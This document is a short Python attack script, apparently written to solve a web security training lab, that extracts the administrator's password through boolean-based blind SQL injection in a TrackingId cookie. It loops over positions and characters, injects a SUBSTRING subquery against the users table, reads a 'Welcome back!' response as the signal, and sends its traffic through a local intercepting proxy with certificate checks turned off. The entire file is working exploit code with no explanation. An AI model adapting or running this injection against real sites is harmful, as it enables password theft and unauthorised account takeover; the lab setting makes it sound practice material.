#!/usr/bin/python3
#_*_ coding: utf-8 _*_

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

characters = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
password = ""

for l in range(1,21):
    for c in characters:
        try:
            url = "https://acb71f7d1eda33cdc0b271ad007b000c.web-security-academy.net"
            proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
            headers = {"Host": "acb71f7d1eda33cdc0b271ad007b000c.web-security-academy.net",
            "Cookie": "TrackingId=4tZ0X9uWb0wkjTao' AND (SELECT SUBSTRING(password,"+str(l)+",1) FROM users WHERE username='administrator')='"+c+"; session=z8vY6PQ1DQgT1QU5hfj0gRHWkBJDhSsW"}
            r = requests.get(url=url,headers=headers,proxies=proxies,verify=False)

            for x in r.text.split("\n"):
                if "Welcome back!" in x:
                    password += c
                    print("[+] Administrator password => "+password)

        except:
            print("An exception occurred")
            exit()